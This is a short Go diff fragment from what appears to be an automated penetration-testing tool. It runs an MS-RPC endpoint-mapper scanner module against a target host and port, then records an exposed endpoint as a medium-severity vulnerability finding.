+	module := exploit.NewMSRPCScanner()
+	module.SetOption("RHOSTS", host)
+	module.SetOption("RPORT", port)
+
+	result, err := module.Run(ctx)
+	if err != nil {
+		action.Result = fmt.Sprintf("MS-RPC scan error: %v", err)
+		action.Success = false
+		return action, nil
+	}
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	if result.Success {
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "msrpc_exposed",
+			Severity:    "medium",
+			Target:      target,
+			Description: "MS-RPC endpoint mapper exposed - potential attack surface",
+			Timestamp:   time.Now(),
+		})
+	}
+
 	return action, nil
 }
